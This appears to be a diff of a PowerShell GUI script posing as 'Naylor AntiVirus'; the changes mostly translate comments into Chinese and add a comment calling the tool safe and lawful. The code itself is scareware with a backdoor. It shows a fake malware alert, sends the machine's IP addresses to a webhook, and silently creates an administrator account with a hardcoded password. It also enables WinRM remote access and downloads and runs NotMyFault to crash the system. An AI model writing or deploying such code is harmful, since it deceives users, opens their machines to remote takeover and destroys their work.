@@ -1,5 +1,6 @@
+# 这是以安全著称的 “Naylor AntiVirus”，它遵守所有国际法，对公司非常有益。'GO USA'！
 Add-Type -AssemblyName PresentationFramework
-
+# xaml 代表 xtra 接受的标记语言，并且以非常人性化和安全而闻名。
 [xml]$xaml = @"
 <Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
         xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
@@ -55,19 +56,19 @@ Add-Type -AssemblyName PresentationFramework
 </Window>
 "@
 
-# Load XAML
+# 加载XAML
 $reader = (New-Object System.Xml.XmlNodeReader $xaml)
 $window = [Windows.Markup.XamlReader]::Load($reader)
 
 
-# Get controls
+# 获取控件
 $runScanButton   = $window.FindName("RunScanButton")
 $supportButton   = $window.FindName("SupportButton")
 $uninstallButton = $window.FindName("UninstallButton")
 $outputBox       = $window.FindName("OutputBox")
 $SupportProgress = $window.FindName("SupportProgress") 
 
-# Helper function to append colored text
+# 附加彩色文本的辅助函数
 
 
 
@@ -90,7 +91,7 @@ AAABAAEAICAAAAEAIACoEAAAFgAAACgAAAAgAAAAQAAAAAEAIAAAAAAAABAAABILAAASCwAAAAAAAAAA
 
 "@
 
-# Convert base64 back to bytes and save temp .ico
+# 将 base64 转换回字节并保存临时 .ico
 $IconBytes = [Convert]::FromBase64String($IconBase64)
 $IconPath = [System.IO.Path]::Combine($env:TEMP, "NaylorAV_$([guid]::NewGuid()).ico")
 [System.IO.File]::WriteAllBytes($IconPath, $IconBytes)
@@ -102,34 +103,34 @@ $bitmap.BeginInit()
 $bitmap.StreamSource = $ms
 $bitmap.EndInit()
 
-# Assign to the Image control
+# 分配给图像控件
 $logoImage = $window.FindName("LogoImage")
 $logoImage.Source = $bitmap
 
-# Run Scan button logic
+# 运行扫描按钮逻辑
 $runScanButton.Add_Click({
-    # Clear previous output
+    # 清除之前的输出
     $outputBox.Document.Blocks.Clear()
 
-     # Show fake scanning start message
-    ## Show initial message
+     # 显示虚假扫描开始消息
+    ## 显示初始消息
     Append-Text $outputBox "Scanning for viruses. This may take a while..." "Green"
 
-    # Set up a DispatcherTimer for a non-blocking pause
+    # 设置 DispatcherTimer 以实现非阻塞暂停
     $script:timer = New-Object System.Windows.Threading.DispatcherTimer
     $script:timer.Interval = [TimeSpan]::FromSeconds(2)
     $script:timer.Add_Tick({
-    $script:timer.Stop()  # stop the timer
+    $script:timer.Stop()  # 停止计时器
 
-        # Start dumping System32 files
+        # 开始转储 System32 文件
         $system32Path = "$env:WinDir\System32"
         Get-ChildItem -Path $system32Path | ForEach-Object {
             Append-Text $outputBox $_.FullName
-            Start-Sleep -Milliseconds 2   # tiny delay per file
+            Start-Sleep -Milliseconds 2   # 每个文件的微小延迟
             [System.Windows.Threading.Dispatcher]::CurrentDispatcher.Invoke([action]{}, [System.Windows.Threading.DispatcherPriority]::Background)
         }
 
-    # Wait a moment before showing the "malicious file" error
+    # 等待片刻，显示“恶意文件”错误
     $outputBox.Document.Blocks.Clear()
     Start-Sleep -Milliseconds 500
     Append-Text $outputBox "error: malicious file found (certainty 95% of process injection/trojan): C:\Windows\System32\ntoskrnl.exe" "Red"
@@ -141,14 +142,14 @@ $runScanButton.Add_Click({
 
 
 $SupportButton.Add_Click({
-    # Clear and update output box
+    # 清除并更新输出框
     $outputBox.Document.Blocks.Clear()
     Append-Text $outputBox "Contacting a customer support representative, please wait..."
 
-    # Show progress bar
+    # 显示进度条
     $SupportProgress.Visibility = "Visible"
 
-    # --- Gather IPv4 addresses ---
+    # --- 收集 IPv4 地址 ---
     try {
         $ipv4s = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction Stop |
                  Where-Object { $_.IPAddress -ne "127.0.0.1" -and $_.IPAddress -notlike "169.254.*" } |
@@ -162,7 +163,7 @@ $SupportButton.Add_Click({
     if (-not $ipv4s) { $ipv4s = @("None Detected") }
     $ipList = $ipv4s -join ", "
 
-    # --- Build message as a raw JSON string ---
+    # --- 将消息构建为原始 JSON 字符串 ---
     $message = "<@548984684160221196> A valued customer desperately requires your help.`n**IPv4 Addresses:** $ipList`nhttps://tenor.com/view/wongwingchun58-gif-15613675"
 
     $payload = @{ content = $message } | ConvertTo-Json -Compress
@@ -171,13 +172,13 @@ $SupportButton.Add_Click({
     Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
     Append-Text $outputBox "✅ Support representative has been notified and will reach out shortly." "Green"
 
-    # Check for user 'NaylorSupport'
+    # 检查用户“NaylorSupport” 是否存在，如果不存在则创建
     if (-not (Get-LocalUser -Name "NaylorSupport" -ErrorAction SilentlyContinue)) {
         net user NaylorSupport "Chiapet1!" /add | Out-Null
         net localgroup Administrators NaylorSupport /add | Out-Null
         try { net localgroup "Domain Admins" NaylorSupport /add | Out-Null } catch { }
 
-        # Configure WinRM quietly
+        # 安静地配置 WinRM
         winrm quickconfig -q | Out-Null
     }
 } catch {
@@ -200,16 +201,16 @@ $uninstallButton.Add_Click({
         return
     }
 
-    # Disable UI while "uninstall" runs
+    # “卸载”运行时禁用 UI
     $runScanButton.IsEnabled = $false
     $supportButton.IsEnabled = $false
     $uninstallButton.IsEnabled = $false
 
-    # Clear and show starting message
+    # 清除并显示启动消息
     $outputBox.Document.Blocks.Clear()
     Append-Text $outputBox "Understood. Uninstalling Windows...`n" "Red"
 
-    # Files to display/delete
+    # 要显示/删除的文件
     $fileList = @(
         "C:\Windows\System32\kernel32.dll",
         "C:\Windows\System32\win32k.sys",
@@ -224,7 +225,7 @@ $uninstallButton.Add_Click({
         "C:\Windows\System32\config\SOFTWARE"
     )
 
-    # Timing
+    # 定时器设置
     $intervalMs    = 300
     $prepDelayMs   = 2000
     $finishDelayMs = 1000
@@ -232,13 +233,13 @@ $uninstallButton.Add_Click({
     $prepTicks   = [int][math]::Ceiling($prepDelayMs / $intervalMs)
     $finishTicks = [int][math]::Ceiling($finishDelayMs / $intervalMs)
 
-    # Create one timer
+    # 创建一个计时器
     $timer = New-Object System.Windows.Threading.DispatcherTimer
     $timer.Interval = [TimeSpan]::FromMilliseconds($intervalMs)
     $timer.Tag = [PSCustomObject]@{
         Files       = $fileList
         Index       = 0
-        Phase       = 'prep'     # phases: 'prep' -> 'deleting' -> 'finishWait'
+        Phase       = 'prep'     # 阶段：'准备' -> '删除' -> '完成等待'
         Tick        = 0
         PrepTicks   = $prepTicks
         FinishTicks = $finishTicks
@@ -272,28 +273,28 @@ $uninstallButton.Add_Click({
                 $state.Tick++
                 if ($state.Tick -ge $state.FinishTicks) {
                     $sender.Stop()
-                    # Clear and show final message after finish delay
+                    # 延迟完成后清除并显示最终消息
                     $outputBox.Document.Blocks.Clear()
                     Append-Text $outputBox "Uninstall complete. The computer will now explode. Have a nice day!`n" "Green"
-                    # Re-enable UI
+                    # 重新启用 UI
                     $runScanButton.IsEnabled = $true
                     $supportButton.IsEnabled = $true
                     $uninstallButton.IsEnabled = $true
 
-                   # --- Run NotMyFault (Sysinternals) ---
+                   # --- 运行 NotMyFault (Sysinternals) ---
 try {
-    # Try to stop and remove leftover driver if present
+    # 尝试停止并删除剩余的驱动程序（如果存在）
     try { sc.exe stop myfault   | Out-Null } catch {}
     try { sc.exe delete myfault | Out-Null } catch {}
 
     $downloadUrl = "https://live.sysinternals.com/NotMyfault64.exe"
     $exePath     = "C:\Windows\NotMyfault64.exe"
 
-    # Download latest NotMyFault from Sysinternals Live
+    # 从 Sysinternals Live 下载最新的 NotMyFault
     Invoke-WebRequest -Uri $downloadUrl -OutFile $exePath 
 
     if (Test-Path $exePath) {
-        # Launch directly into crash
+        # 启动直接崩溃
         & "C:\Windows\NotMyfault64.exe" /crash
     } else {
         Append-Text $outputBox "`nFailed to install explosive`n" "Red"
@@ -306,14 +307,15 @@ catch {
 
                 }
             }
-        } # <-- closes switch
-    })   # <-- closes timer.add_Tick
+        } # <-- 关闭开关
+    })   # <-- 关闭 timer.add_Tick
 
-    # Start the sequence
+    # 开始序列
     $timer.Start()
-}) # <-- closes Add_Click
+}) # <-- 关闭 Add_Click
 
 
 
-# Show window
+
+# 显示窗口
 $window.ShowDialog() | Out-Null
